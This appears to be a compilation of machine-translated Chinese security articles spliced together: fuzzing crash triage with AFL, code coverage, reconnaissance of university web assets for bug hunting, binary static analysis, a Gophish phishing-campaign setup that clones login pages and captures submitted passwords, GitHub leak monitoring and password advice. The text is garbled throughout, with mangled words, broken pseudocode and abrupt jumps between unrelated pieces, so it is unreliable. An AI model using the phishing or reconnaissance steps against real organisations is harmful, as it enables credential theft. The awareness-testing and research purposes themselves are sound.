The code of the target program is almost completely covered by test cases seems rare but it should be possible for some small programs as to how to calculate coverage will be described below.

Of the various data provided by pythia mentioned above, once path covera reaches 99% (usually unlikely), f u z z can be suspended if more crash is not expected, because many of the crash may be caused for the same reason.

Another point is that correctness is worth 1e-08, and according to pythia developers, about 100 million execution takes place from the last path/uniq crash to the next discovery, which can also be used as a measure.

There are many files in the afl-fuzz output directory that sometimes you might have to use to write a helper.

As a result, we may have run out of a lot of crashes,, so the next steps, naturally is to determine whether the b u g causing these crashes can be used, how to use it?This is another important aspect.

Of course, I think it is much harder than all mentioned above, which requires a deep understanding of the common types of binary vulnerabilities, the security mechanism of the operating system, code audit and debugging.

But if you just do a simple analysis and classification of crash, then the several methods introduced below can give us some help.

This is a running mode of afl-fuzz, also known as peruvian rabbit mode, used to determine the availability of bug, and specific details can be referred to lcamtuf's blog.

Using a resulting crash test case as input to afl-fuzz, turning on crash exploration mode with the-C option, you can quickly produce a lot of crashes, s related to the input c r a s h to determine the length of a piece of memory address.

tcpdump stack overflow vulnerability, crash exploration mode generates 42 new crash, s from a crash and reads different sizes of adjacent memory.

A experimental directory in the AFL source is named triage_crashes.The sh script that can help us trigger the collected crashes.

If you want a more detailed crashes classification results and the specific reasons for crashes, then crashwalk is one of the good options.

The former is by reading crashes/README.The txt file gets the execution command for the target (mentioned in section 3), which can specify some parameters manually.

The tool is much more detailed than the previous methods, but the results seem confusing when there is a lot of crashes.

The last recommended tool is afl-collect,, which is also a tool in the afl-utils suite, and is also based on exploitable to check crashes availability.

It automatically removes invalid crash samples, removes duplicate samples, and automates sample classification.

Code coverage is an extremely important concept in fuzzy testing. Using code coverage can evaluate and improve the test process, the more code you execute, the greater the possibility of finding bug, after all, b u g is not found 100% in the covered code, but 100% no bug in the uncovered code, so the relevant concept of code coverage is detailed in this section.
Code coverage is a way to measure the coverage of the code, meaning whether a line of code in the source code is executed; for a binary program, this concept can also be understood as whether an instruction in the assembly code is executed.

It is widely measured, but both GCC GCOV or LLVM SanitizerCoverage, provide three levels of coverage detection: function (function), basic block (basic-block), boundary (edge), and more specific details can be referred to the official L V M documentation of LLVM.

After the first instruction in BB is executed, subsequent instructions will also be fully executed, with the same number of execution of all instructions in each BB, that is, a BB must satisfy the following features:  With only one entry point, the instruction in BB is not the target of any jump instruction.

So what is an edge?We can view the program as a control flow graph (CFG), where each node of the graph represents a basic block, while e d g e is used to represent the jumps between the basic blocks.

Knowing the number of executions per basic block and jump, the number of executions per statement and branch in the program allows for finer-grained coverage information than recording BB.

Specifically to the implementation of AFL, the biple (branch_src,branch_dst) is used to record the information of the current basic block + the previous basic block, so as to obtain the execution process and code coverage. The pseudo code is as follows: As actually inserted in the figure below, first save the values of various registers and set ecx/rcx, and then call. The content of this method is quite complex, but its main function is similar to the above pseudo code above, used to record coverage and put it into a piece of shared memory.

Knowing the concept of code coverage, then look at how to calculate the code coverage of our test case for the previous test target.

One of the tools to be used here is GCOV which publishes with gcc so no need to install alone and like the principle of afl-gcc pile compilation the program for gcc compile time for g c c to generate code coverage information at execution.

Another tool is LCOV, which is the graphical front-end of GCOV to collect gcov data from multiple source files and to create source code HTML pages that contain annotations using coverage information.

The last tool is that afl-cov, can quickly help us call the first two tools with code coverage results from afl-fuzz test cases.

You can use installing afl-cov, in ubuntu but this version does not seem to support branch coverage statistics, so it is better to download the latest version from Github without installing the Python script in the direct running directory.

We can calculate coverage with-live choice with the fuzzer run or after the test and end with an html file like below.

It provides both an overview page that displays the coverage of each directory; or you can see the coverage of a specific file by clicking on to a directory.


The number before each line of code represents the number of times this line of code is executed, and the unexecuted code is marked in red.


At the beginning of the goby sweep, I was also like the vegetable brother, I did not feel anything, until a master reminded me: is this not a Sprint boot framework, so many holes?That also led to my later percent hole.

(Can only steal the master idea of chip brother) information collection can be collected from multiple fields: the company, subsidiaries, domain name, sub-domain name, IPV4,IPV6, small program, APP,PC software and so on I mainly work in EDUsrc, the universities are also counted in the company.

For example, in a university, what can we do after checking the university?So we can focus on the filing websites, APP, small programs, WeChat public accounts, and even micro blogs, microblog sites, and convert them into our available resources.

How should we do when we have the domain name?That is of course blasting secondary domain, tertiary domain, we can choose OneforALL, validation subdomain and then use masscan validation port but I generally use subdomain harvester (of course layer can also) here because the tools are not my own and not convenient to offer.

Passive information gathering Passive information collection is using some online mass crawling websites.

Because these grammar tax net quite much, (individual) do not take specific website to do display.

Google hack syntax Baidu syntax Fofa syntax shodan syntax Zhong Kui eye micro step online Google let's look at Google,Google syntax you may be familiar with the most basic edu website suffix.

Baidu syntax and google grammar have no big gap between Fofa grammar and how to locate a school in fofa?There are two ways one is org, one is icon_hash is afraid to find assets?Because a school's icon_hash is often a few fixed, so when we search for icon_hash, we will also have different results.

Due to the lack of structured information in source code of binary programs faces the problem of imprecise problem of value set analysis (vaule-set analysis,VSA) and control flow recovery, but binary programs are easier to obtain compared to source code, so this research work has always had new research dynamics, and the two technologies of the current process will be introduced in Part 2.

Before further analysis, we first come to specifically explain the two questions presented above.

Value set analysis is a static analysis algorithm that combines numerical and pointer analysis.

VSA is an abstract interpretation-based, flow-sensitive, context-sensitive method that supports inter-process analysis.

The VSA first builds an abstract memory model, recovers the variables in the executable program as expressed by the abstract addresses, and then statically calculates the set of values that the abstract address may contain for each instruction.

The typical value set analysis algorithm for a pseudocode representation of the jiheW in the figure above below is called word-list, and its operations include add,removeNext, for adding and removing items, respectively.

The Word-list is sorted in topological order, initialized with the entry point of the base block to indicate the forward analysis starting from here.

In each iteration of the while loop, the Analysis function is called at line 6 to analyze the selected base block.

The Analysis produces a large number of output states based on the input states, and those varying output states are added to the word-list.

When there are two input states on the same basic block, the VSA merges the two input states into the new input states at line 11.

The merge operation merges the set of values for each variable in the abstract state.

The merged arithmetic equation for variables is shown below. When the program has read and write memory, depending on the value set of the destination address and the length of the memory address to be read and write, we can detect whether it exceeds the space size of the corresponding variable.

If exceeded, it can be reported as a potential vulnerability.

However, since the set of values obtained by the VSA is approximate and not accurate, it may lead to higher false positives rates.

Here is a 19-year master's thesis, Binary Use-After-Free Vulnerability Mining Technology Research, which describes mining UAF based on value set analysis. If you are interested, you can see it.

Control flow recovery inaccurately refers to that static analysis does not need to execute the program, only through the analysis of the binary file structure and instruction operation code, static analysis pays attention to the global program analysis, so it has a high code coverage, but cannot solve the problem of indirect jump, unable to obtain the complete control flow information.

The control flow analysis of binary code should first complete the static decomassembly of binary code.

Depending on the differentiation of code and data methods, static disassembly strategies can be divided into three categories: linear scanning disassembly, recursive disassembly, and heuristic disassembly.

The current most widely used static reassembly strategy is a recursive strategy based on the static control process of programs, and the IDA uses the recursive descent algorithms.

Next, the division of the basic block is a sequence of sequentially executed statements in a program, with only one entry statement and an exit statement.

Thus, overwriting executing the basic block is equivalent to overwriting all instructions for the basic block.

Analysis of the reassembly effect in basic blocks is more efficient than analysis of instruction-level granularity.

Basic block entry definition: a) the next instruction of the code snippet tags (_start and _main are the flags that appear in front of the code segment); b) the CALL instruction in the instruction order flow; c) the jump statement in the next instruction of the instruction order flow.

Basic block export definition: a) the last instruction of the code snippet; b) CALL instruction; c) jump instruction; d) return instruction.


After completing the basic block division of the target binary program, Analysis of the control flow steering between the basic blocks is required, Complete the drawing of the control flow, Pseudocode following input: basic block list blockoutput:CFGfor i=1 to n dox=block[i]_lastinstrif x is a CTI then establishes a directed edge else if x not a CTI then of block[j] where target jumps from block[i] to x establishes edge end forreturn from block[i] to block[i + 1] CFG2 before one, Binary static vulnerability mining techniques mainly include techniques based on pattern matching and patch alignment.

2.1 What is a pattern matching?In computer science, pattern matching is the behavior of checking a given sequence of markers for certain components of the patterns.

Contrary to pattern recognition, matching must often be accurate: " Match or mismatch."Patterns usually have the form of a sequence or tree structure.

The uses of pattern matching include the location of the pattern in the output token sequence, exporting some components of the matching pattern, and replacing the matching pattern with certain other token sequences.

For binary analysis, pattern matching techniques are generally not applied separately, such as combined with VSA.

Take GUEB as an example, which proposes the UAF vulnerability mode in the binary program, and excavates the vulnerability in the ProFTPD program based on this mode.

Specifically, the memory model in the binary function is first abstracted, and then the VSA analysis technology is used to track the operating variables related to the heap allocation and release instructions, and establish the UAF mode based on this.

The full text is driven by an example. The source code is noted here. Although the code is given here, the work in the article is conducted from the binary level, and the source code is given to facilitate illustration.

First abstracting the memory model we assume that the address in the stack is expressed as an offset relative to the base address register EBP.

Since the interprocess analysis is achieved in-line, each stack element is represented by (EBP0, offset), where EBP0 is the initial value of EBP.

For example, p_index is represented by (EBP0,24), and p_global_save is represented by (EBP0,36).

The global variable has a constant address represented by the identifier, and here is the variable name (for example, pglobal).

For the heap, we define the HE as the jihe. of all the possible heap elements

The element of the HE is (base address, size), where b a s e is the assignment identifier and s i z e is the assignment size.

Such a pair is also called a chunk.The PC is the jihe. for all program pointers

We defined HA and HF, two functions that correlate all the currently assigned or unassigned jihepc at each point, respectively (HA PC P (HE), HF PC P (HE), and P (S) being dense for S).

We use the classical assumption in static pointer validation, arguing that each allocation provides a new block of memory (although this method is impractical to study availability, it is sufficient to detect vulnerabilities).

The VSA was followed in the last step of GUEB, extracting subgraphs of UAF vulnerability patterns from the binary level, as shown below is useful to study whether the UAF is available and how: for example, whether a new malloc. occurred when releasing and unencing at line 33

2.2 Patch refers to the patch provided by software developers to repair various vulnerabilities or defects in the software system.

For open-source software, the patch itself is the source code, and the patching process is about replacing the original code with the source code in the patch.

For closed-source software, vendors only provide modified binary code, such as Microsoft's Windows system patch.

This requires binary code alignment technology to locate the software vulnerabilities of the patch.

Vulnerability mining based on patch comparison refers to a vulnerability mining method to find new vulnerabilities according to the software defect location by comparing and analyzing the differences between the original program and the vulnerability repair and the software defects corresponding to the known vulnerability.There is a long time window between patch release and deployment, so the rapid extraction of vulnerability features through patch vulnerability mining is of great significance for software operation security detection and protection.At present, the complexity of the software itself makes it difficult to quickly reverse the vulnerability details and understand the vulnerability mechanism.Patch modifications unrelated to the vulnerability cause a considerable degree of interference, and patch vulnerability mining still requires the support of the software underlying theory.To this end, the researchers proposed several basic analysis tools based on graph comparison algorithms, such as IDACompare, EBDS, BinDiff et al.Representative work of patch vulnerability mining is the APEG (a u t o m a t i c p a t c h-b a s e d e x p l o i t g e n e r a t i o n) scheme proposed by the Brumley team (paper at the IEEE S&P Conference 2008).

The core APEG idea is based on the assumption that the filtering conditions to trigger the original program crash are added in the patch.

Therefore, it can be considered an available input candidate for the original program as long as finding the location of adding the filter conditions in the patch, while constructing a "violation" input that does not meet the filter conditions.

The work is divided into three steps: first, using the binary difference comparison tool (for example, BinDiff and EBDS, etc.) to find the location of the patch, second, find the input data that does not meet the patch detection point as the utilization candidate for the original program; finally, to screen all effective uses of the original program overflow or control stream hijacking.

Based to experimental results on multiple patches released by Microsoft, the method has strong reliability and utility.

APEG is the first attempt at automating vulnerability utilization building, and despite the simple core idea, has been generally recognized by other researchers due to its strong operability.


Then is to climb to the url asset verification screening, to tell the truth, here this teacher did spend some time, until now or not satisfied, because for a rookie who wants to pick up loopholes, naturally the more url assets collected the better, the thinner the better, but write that bug more and more, until one day, I realized.

Lead the teacher told me, to your current level can only pick up garbage also can not pick up loopholes, I asked the master why, the master smiled but silent, pointed to my sky, at that moment, I have realized.

Currently, the LibAFL project is developed and maintained by Andrea Fioraldi and Dominik Maier.

LibAFL is a ready-to-use fuzzy testing tool that supports researchers in fully customized development, including several prominent features: Fast Run: We do what we can to compile and keep runtime overhead minimal.

In frida mode, the phone can run up to 120k use-case execution / second (using all cores).

Strong scalability: Support LibAFL linear extension and extends to multiple devices through TCP.

Applicability: You can replace the various modules of the LibAFL at will.

For example, BytesInput is just an available form input module, and we can also arbitrarily add an AST-based input for structured blur testing, etc.

Cross-platform use: LibAFL supports use on platforms like Windows, macOS, Linux and Android (x86_64 and Arch64), and LibAFL can also have built-in no_std for fuzzy testing of embedded devices and hypervisors.

First of all, we need to install the Rust language development environment on our local device.

We strongly recommend not using the Linux distribution package because it has expired.

We recommend that you install the Rust. directly


The most complete fuzzy tester is./ fuzzers/libfuzzer_libpng, It is a fuzzy tester for a multi-core class libfuzzer.

Technology changes with each passing day, dazzling, this series of articles hope to introducing typical representative work (focusing on security academic Big4, namely four top results), to help you clarify the context and related technology, after the academic development or career development, can find the direction of development.

According to the traditional classification method, it can be divided into static and dynamic vulnerability mining techniques.

Static vulnerability mining technology refers to the analysis of the target program without running the target program, which can be divided into source code and grammar, syntax, semantics for binary programs, and through relevant tools to obtain its AST,CFG,DDG,PDG,CPG for auxiliary analysis, to exploit the vulnerability.

An AST, an abstract syntax tree (Abstract Syntax Tree,AST), or simply a syntax tree (Syntax tree), is an abstract representation of the syntax structure of the source code.

It presents the syntax structure of the programming language in the form of a tree, and each node on the tree represents a structure in the source code.

It represents the possible flow of all basic block execution in a process and can also reflect the real-time execution of a process.

The following figure is a C F G containing the if and while statements mentioning the CFG, and many people will think of the CFI (Control Flow Integrity) control flow integrity technology, which was proposed to defend against the control flow hijacking attacks.

We know that early attacks would use code injection, by deploying a piece of shellcode, and then turning control to this code execution, and to organize such attacks, the DEP (D a t a-E x e c u t i o n P r e v e n t i o n) mechanism was developed to restrict memory pages from having both write and execution permissions.

In order to break through the DEP, the attacker invented the code reuse-based attack technology, using the code snippets in the attack program to form the attack logic, including Ret2libc,ROP,JOP, etc., and proved to be Turing-complete.

In computability theory, a series of rules are Turing-complete if the operational data can be used to simulate any Turing machine.

In other words, R O P can do all the attacks that the technology that originally deployed shellcode to jump performs.

The DDG is the data dependency graph representing the data dependency between the individual instructions in the simplest form.

Each node in such a graph represents an instruction, and is called an "atom" node.

You can also combine certain atomic nodes between them with simple def-use dependencies into larger nodes containing multiple instructions.

The system program dependency graph is a graphical representation of the control dependencies and data dependencies between software programs.

The CPG code attribute graph was the first proposed by ShiftLeft, as shown below, the CPG provides extensible and multilayer logical representations for the unique version of the code for each application, including control flow diagram, call graph, program dependency graph, directory structure, etc.

CPG creates a multi-layer 3 D representation of the code with strong insight that allows developers to be fully aware of what each version of the application performs and the possible risks.

Let's take a look at static analysis.

The vulnerability mining for source code is divided into two categories based on intermediate representation and based on logical reasoning.

Analysis techniques based on intermediate representation mainly include data flow analysis, control flow analysis, stain analysis, symbol execution, etc.

In fact, these technical means tend to be applied in research work.

Data flow analysis is a compile-time technique that collects semantic information from the program and determines the definition and use of variables at compile-time through algebraic methods.

Through data flow analysis, you can discover the behavior of the program at runtime without actually running the program.

Briefly, data flow analysis is the process of collecting information on various aspects of the use, definition and their dependencies in programs.

The control flow diagram is a graphical representation of all paths that may go through when the program is executed.

The program structure can be obtained by merging some of the statements within the process depending on the relationships between the different statements, especially considering the branching relationships introduced by "conditional transfer", "loop", etc.

The control flow diagram is a directed graph: the knots in the graph correspond to the merged block of basic statements in the program, and the edges in the graph correspond to the possible branch directions, such as conditional transfer, cycle, etc., which are important information for analyzing the behavior of the program.

Stain analysis is a technique to track and analyze the flow of stain information in a program, whose analysis object is stain information flow.

Sstain refer to contaminated information.

In program analysis, information from outside and into the program is taken as stain information.

The data needed by the analysis, used within the program can also be used as stain information and analyze the flow of its corresponding information.

It can be divided into static stain analysis and dynamic blot analysis.

The process of stain analysis includes identifying the production point of stain information in the program and marking the stain information; tracking the propagation process of stain information in the program with specific rules; and checking whether key operations are affected by stain information at some key program points.

The generation point of stain information is called source point, and the checkpoint of stain information is called sink point.

The following figure is an example of the stain analysis procedure taking the program point where scanf lies as a source point, marks the user input data received through scanf as stain information, and considers the variable x in which it is stored contaminated.

If it is stated in the stain propagation rule that "if the operand of the binary operation is contaminated, then the result of the binary operation is also contaminated", for y=x + k, y is also considered contaminated because x is contaminated.

A contaminated variable will be considered unpolluted if it will be assigned a constant.

For x=0, x was transformed from the contaminated state to the unpolluted state.

For while (i <y), the procedural point at which this sentence is considered a sink point here, and if the blot analysis rule states that "the number of cycles cannot be controlled by the program input", then it is necessary to check whether the variable y is contaminated here.

Symbol execution is a technique that performs programs with symbolic values instead of numerical values, and a symbol is a notation representing a collection of values.

When performing an analytic program using a symbol, for a variable representing a program input, you usually use a symbol to represent its value that can represent all possible inputs that the program receives here.

In addition, the variables that are not easy or unable to determine the values are often analyzed using a symbolic representation.

The analysis process of symbol execution is roughly as follows: First, some variables in the program that need to pay attention to but can not directly determine their value represent their value by symbol, and then analyze the possible execution process of the variables in the program, the value as the calculation expression of symbols and constants.

The main removal of the normal execution of the program and the symbol execution is: during the normal execution, the variables in the program can be regarded to be given a specific value, and when the symbol execution, the value of the variable can be both the specific value or the operational expression of symbols and constants.

The symbol execution source code of the following diagram is an example. The parameters x and y in the function respectively use the symbol a, b means that the code based on the above diagram can get the program flow chart shown in the following diagram can see a total of three execution paths, each path corresponding to a path constraint.

There is one path returning true, and the corresponding path constraint is a> 60 & (b * 2) ==128; two paths returning false, the corresponding path constraint is a <=60 | (a> 60 & (b * 2)!=128)

This example shows that using symbols to perform the technical analysis program, for the conditional control transfer statement (conditional branch statement, circular statement, etc.) encountered in the program encountered in the analysis process, the symbolic expression of the variable can transform the control transfer statement into the constraint on symbol value, and determine which path of the program can be satisfied is feasible.

This part is a key part of the symbol execution analysis.

Thus, the problem of judging whether the path condition can be satisfied is transformed into the question of judging whether the constraint of the symbol taking the value can be satisfied.

As for the judgment of whether the constraint is satisfied, the method of constraint solution is usually used, which is done by the constraint solver.

In the analysis of symbol execution, the constraints is often solved using satisfiability mode theory (satisfiabilti modulo therries,SMT) solver, so the solution problem of symbol value constraint should be turned into SMT problem, the satisfiability judgment problem of first-order logic.

The vulnerability detection method based on logic reasoning formalizes the source code, and then uses mathematical reasoning and proof methods to verify some properties of the formal description, so as to judge whether the program contains some type of vulnerability.

The vulnerability detection method based on logical reasoning has rigorous analysis and reliable results based on mathematical reasoning.

But for larger-scale programs, formalizing the code representation in itself is a very difficult task.

So the research value is relatively small.

K-Miner, published in 2018 NDSS, enables highly standardized pointer analysis to global context-sensitive analysis technology in kernel code, and supports the detection of memory crash vulnerabilities such as null pointer reference, pointer rereference after pointer release, pointer rerelease, and double check lock.

In step 2, this context information is used to analyze individual system calls, which can be run multiple times continuously, such as analyzing dangling pointer,use-after-free and double free.

In step 3, the error reports were cleaned up by various validation techniques to reduce the false alarm rate.

In step 4, the sorted reports are presented using our vulnerability report engine.

In the experiment, K-Miner identified 29 possible vulnerabilities, generating a total of 539 alert, 3.2 shown below 3.2 Based on logical reasoning, individuals have not seen relevant work in recent years, but for the integrity of the article, the work of CCS 2002 (CCS is also one of the four top meetings) -MOPS.

The paper the authors first determine the rules of security programming practices, encode them as security properties, and verify compliance with them.

Because manual validation is too cumbersome, a program analysis tool is automated to complete this procedure.

The program analysis that the program will be verified is modeled as a push-down automaton, representing the security attributes as a finite-state automaton, and uses model checking techniques to determine whether any state violating the expected security target can be reached in the program.

The full text is logical, only a few pictures are not clear, suggest interested masters to see this paper, give a simple example, take the process permission system call as an example.

Process permission model is a risky system call model, which is a composite model describing the property, that is, in the privileged state, the process should not make risky system calls.

Of course, the above is a very simplified version, the finer the modeling, the better the effect naturally.

After modeling the process permission model in linux 2.4.17 as described below (including all rued,euid,suid, etc.), an example illustrates that a known security vulnerability was found in wu-ftpdversion 2.4.

Thereafter, the wu-ftpd will be performed using the root privilege, resulting in the attacker having the root privilege.

The MOPS was able to successfully detect the vulnerability in the wu-ftpd2.4 beta 11.

The experiment recommended docker to build a vulhub target site for nginx service vulnerability analysis.

Docker is a very popular open source container engine in the past two years, and Vulhub is an open source vulnerability target range for the public.

Through this experiment, we understand the use of Docker and master the Vulhub target site environment for vulnerability recovery.

At the same time, combined with safety training, adjust their safety response, so that employees become the last line of defense of company information security.

Mail security awareness, can simulate the attacks related to daily activities, mail phishing test, detect the sensitivity of employees to phishing mail, early safety journal or safety training security awareness, and then through the mail security test system, the staff phishing test, through the "test", further improve the overall level of information security awareness.

The principle of fast mail phishing test is "fast, cost-free, warning instead of test".

It is recommended to use the Gophish open source project to build a test platform, forge phishing pages, send phishing emails, and have statistical test results.

In the profile config.Change the listening address listen_url in json for your host IP and need to use 3333 and 80 both ports make sure the port is not occupied before opening especially close the httpd service.

Make access management login and first login modification password (username admin, password is printed in the console log).

Quick Configuration phishing platform 1) Configuring mail forwarding can build your own mail server or use free mailbox SMTP service. The following takes 163 netease mailbox as an example: register a forged mailbox in netease mailbox and log in the personal mailbox page to find the SMTP configuration in "Settings".

Open the SMTP service.

Get authorized login password The authorization password is used in other platform login calls, which needs to be recorded and subsequent use.

In Gophish, select "Sending Profiles" Add Message Send Settings Configuration 163 mailbox information, where Part Password is an authorized login password rather than a mailbox password.

Click "Send Test Email" test to send the email successfully.

Configure phishing message templates Select "Email Templates" Add Message Body Template in Gophish.

You can import through a message "Import Email" saved elsewhere, or you can edit the message text directly.

Click to check "Add Tracking Image", will load a hidden img in the body to count whether the message is opened.

Please confirm that the body HTML file is saved.The Tracker}} identifier.

Configuring fake page Configuring fake page, which makes "fish" click to the fake phishing website page.

To select the "Landing Pages" Add fake page " in Gophish.

You can clone the website by clicking "Import Site" input website (some dynamic pages cannot be loaded), or you can modify it manually after loading. You can even save all the files loaded by the real website page to the local server and modify the html file.

Note: Please check "Capture Submitted Data", "Capture Passwords" to obtain the submitted data (account number password)."Redirect to" is the specific page that "Fish" jumped to after forging the page and submitting his account password. It can be a real website or a warning page that he has been caught in phishing emails and should raise security awareness.

Add Phishing Objects In Gophish, select "Users & Group" Add mailbox grouping and attack the mailbox for the object.

Start Fishing Challenge In Gophish, select "Campaigns" New Fishing Attack test.

Select the mail template, fake the phishing page, the URL is the listening host IP, select the object mailbox to fish, and select the time to start immediately.

After an attacked object receives a phishing message in the mailbox, open the message, click the link, submit login data, etc.

After clicking on the hyperlink in the email, you will jump to our forged page: After the forged page submits the login information, you can jump to the specified website, and we have designed a warning page.

At this point, the victims will open the email, click on the link, submit the account password will be captured.

Diversified test for different departments of the enterprise positions, can set up different attack methods, design different scenarios.

Regularly comb email accounts, ban long-term unused accounts; regularly conduct password security tests to avoid weak passwords.

Safety awareness promotion through a variety of ways of continuous information security awareness publicity (publicity publication + training + fishing test + warning).

Regular safety tests regularly carry out fishing test activities in different ways with targeted scenarios in different departments, so as to promote safety awareness through inspection.

There are multiple open source projects for GitHub code leakage monitoring class, Hawkeye, VKSRC open source Github-Monitor, etc,

In the personal test practice, code XiaoVI is one of the friendly and simple experience and continuous maintenance, which can help quickly conduct code monitoring and implementation practice. Through the system, the internal code leakage of the enterprise is found in time, thus reducing a series of security risks caused by code leakage.

Configuration use monitoring system configuration using full time graphical interface, easy to operate.

Adding a Github token first requires generating a personal account token on the Github.

Login to GitHub, in the Personal Center Settings-> Developer settings-> Personal access tokens-> Generate new token, content option does not have to tick the generation token.

Then add a token within the code leak monitoring system.

In the Configuration Center-> token configuration, click the new token (or you can directly click the window to generate the token).

Each token has 3 maximum 30 requests per minute, updated per minute.

The new token needs to be synchronized and the status is normal.

Configuration Monitoring Task In Configuration Center-> Task Configuration, first view the key description.

Add monitoring tasks, click New, configure scan keywords (support batch addition), and frequency.

Scan results storage Scan results storage currently supports the following options: 1. Record each version of the file: each file submission (contains keywords) produces a new unaudited record 2. 3. A warehouse only record once if you focus on the project dimension can only choose "one warehouse only once", which will greatly reduce the number of records to be reviewed.

The background planning task scans automatically and then moves to the scan results page for view.

Scan results operation in the scan results, click the user name, warehouse name, file path, can directly open the new window, or in "more" choose to view the code snapshot, view the view of the code warehouse content.

The operation shall be set as unreviewed, false report, abnormal, solve, edit instructions or directly delete records, or directly add to the white list.

Alarm notification Allarm notification supports a variety of ways, take mail, for example: in the notification configuration-> message, add receive messages, directly change the line to add.

Note: Port: SSL encryption uses 465, non-encryption uses 25 password: forward mailbox after SMTP/POP3/IMAP authorization code (non-mailbox password) receive mailbox: one line (can not use QQ mailbox, will be blocked by spam) maintenance upgrade directly pull code to generate a mirror.

It is crucial to meet the overall prevention and control of information security, enhance the password security awareness level of all staff, and ensure the security use of passwords.

How was the password stolen?A malicious attacker will try to enter your account using the most commonly used password crack, or use your social networking website (software) public information to guess passwords (common various dictionary libraries, social worker library materials).

If successful, they will use the same password to try to crack your other website accounts.

Malicious attackers can also try to induce people to leak passwords by forging "phishing" emails linked to suspicious sites, or by using persuasive technology through social software.

Even if you protect your password, if a company database that records your details is data leaked, they can still be stolen, and you have nothing to do.

A malicious attacker will use these stolen user information (such as a username and password) to attempt to access and crash other systems in the library.

Give the administrator a minimum length requirement of 8 characters (and longer is not necessarily better).

Cancel the mandatory character complexity composition requirements.

Cancel the mandatory scheduled password reset requirements for the user account.

Common passwords are prohibited to exclude passwords most vulnerable to dictionary attacks from being attacked.

Guide your team members not to use their work password for work-unrelated matters.

Registered use of multifactor identification is as mandatory as possible.

Enterprise employees have the responsibility to ensure the security of the office password and password.

Modify the initial password!Remember that the first step in any system is used to modify the initial password.

Create a unique password for an office app, not the same as a private account.

Set an easy memory and relatively complex password for the system and do not use common phrases.

Keep the terminal computer operating system, browser, and software updated in time.

Be careful to open the email attachments and links in the mail, and carefully enter your account password.

The recommended for commonly visible password and password setting is that the password length is kept above 8 bits (including 8 bits), or even longer.

Although the longer the password length of the account, the longer the blasting is used (and the attack on passwords is longer than violent cracking), excessive length requirements (greater than 14 characters) increase the possibility of adopting other unsafe practices, such as memorizing passwords (common in explicit passwords to sticky notes or notes), using duplicate passwords, random word pinyin combinations, or placing explicit passwords in PC documents.

In order to encourage individuals to consider important systems with unique codes, it is recommended to maintain a reasonable 8-character minimum length, not necessarily too long, recommend between 8-14 bits, which actually complies with our guidance to banning common codes.

The more complex the password, the better the password has a very complex characteristics, and it is not sure that the password you use must be a safe password, set the password to be both safe and easy to remember, too complex password is more likely to forget or lose, and frequent reset password will make it difficult to set a new password.

The shorter the password replacement cycle, the better the survey and research proves that the human knowledge cognitive resource pool is limited, with frequent password replacement, which will consume the password pool resources in their cognitive areas, and will tend to set reused passwords and similar passwords (such as continuous months or years).

Password security only needs to focus on setting the security password to obtain the computer password or system login permission for the Intranet attack, direct violence to crack the computer password, is no longer the only way.

The loopholes of email phishing, social engineering, web Trojan, malware programs, terminal operating system and software can all achieve the purpose of stealing password password and obtaining system permission.

Therefore, the password security password not only need to set a safe password, also need to prevent other ways of network attack, careful email phishing, safe browsing website, keep the computer operating system, anti-virus software, other application software for the latest version (patch can solve more than 90% of the security problem), regular malicious program scanning.

Personal User Guide 3.1 Do not use the office account and password on the ordinary website You must have a lot of important website accounts important for you (such as e-banking, Taobao, Alipay, WeChat, etc.), use a relatively independent password at each site, higher security.

We do not recommend that you apply your office account password to a private account, such as using your office mailbox and registering as an account for other sites, using the same OA system password on personal forums, which may make you more vulnerable to attack.

Therefore, as a containment policy, set a unique office account password and do not reuse the password between multiple sites.

Do not easily disclose your email or account information do not easily inform others, the enterprise email account or about the internal office system related information, which will reduce the difficulty of the account number password attack.

When setting up a secret security question, please use a password answer that only and only you know, rather than using such a simple public answer as your department name, your company name.

When setting your password, it's likely to use word information related to you (for example, you and your family's birthday, your children's baby name and words you like to use). make sure your password is hard to guess.

Reasonable setting of password complexity requires most systems to enforce some level of password complexity requirements (passwords require lowercase letters, numbers, recognizable special characters), while most people use similar patterns (namely, capital letters 1, symbols last or middle, numbers in the back), corporate mode (in company name + year (name abbreviation + year) (date of birth), so they use common alternatives for dictionary attacks, seemingly complex passwords are actually weak passwords.

Do not use common password phrases to set passwords, please do not use common passwords, word pinyin, or phrases, they are easier to be cracked.

E. g., 1,2,345,678, password, iloveyou, Jtyh@2019,1234! The @#, jtyh@888, are all weak passwords.

Passwords can use pinyin or English words, but to make it a unique word in your life, both memory and unique, your company name, abbreviation and birthday.

Do not use the keyboard sequence password.

Using passwords set to with continuous keys on the keyboard may be complex but not secure enough.

Like "1,234 qwer", "1qaz@wsx", "asdfjkl;", "567890- =".

Careful suspicious email has nothing to do with what the website password is, because if you are phishing, then a malicious attacker can steal it.

Therefore, often pay attention to suspicious emails and website links that may induce you to click, leading to installing malware or stealing your password credentials.

Note the following: carefully open the website link in the email or document to copy the website link or directly enter the browser address bar to avoid some phishing links common websites, establish browser collection tags, every time open from the tab to fill in the login website password, should pay attention to check whether the website is correct 3.6 keep your operating system, browser, antivirus software and other software to enhance the ability against common malware, phishing and other common attacks.

For PCs, installing antivirus software and timely patch updates resists more than 90 percent of attacks, including malware or backdoor programs that can steal passwords.

Using as many factor authentication passwords as possible may be forgotten or leaked, so the best option is not to use the password at all, or one more authentication means, so in life, you use as much as mobile phone SMS verification code, fingerprint or face recognition if conditions are possible.

Regularly confirm the password security of your account password After long-term password use, password leakage may occur. If you use your office account or mailbox to register other website applications, you may also cause your password to be no longer safe due to the data leakage of users of other websites.

Password security guidance does not recommend frequent password replacement, but given that the password will spread or leak during use, we suggest that the password replacement cycle is about 6 months (if the password is complex enough and not leaked, the password can not be modified).

Whether you set the new password is safe, whether it belongs to the historical password leakage database, you can log on to the website haveibeenpwned website for detection.

vigilance use social workers to obtain enterprise internal employee account password, is the most effective way to attack the enterprise, "don't because others treat a meal to sell your password", so should improve personal security awareness, daily should be alert for password behavior, do not share password with others, pay attention to account password reset email and other phishing, if found similar events, can be timely reported to IT operation management department."Don't give your password because others treat a meal" password management method everyone has the responsibility to ensure their own password password security, including no empty password, security password, periodic changes, error lock, etc., and so on, the basic principle of password security setting is "easy to remember the balance and complex enough".

Reasonable classification management can separate the system used in the office from the personal registration website application, and separate the important system from the ordinary system.

Set the passwords with different security levels, respectively.

The office system (OA, mailbox, VPN, financial management, etc.) independently set password personal online shopping, electronic banking, alipay / WeChat, private network disk set password appropriate high requirements of technology BBS, community, recruitment website, short video website and other ordinary personal account password can reduce requirements 4.2 password management website application too much, password too much difficult to manage, how to solve.

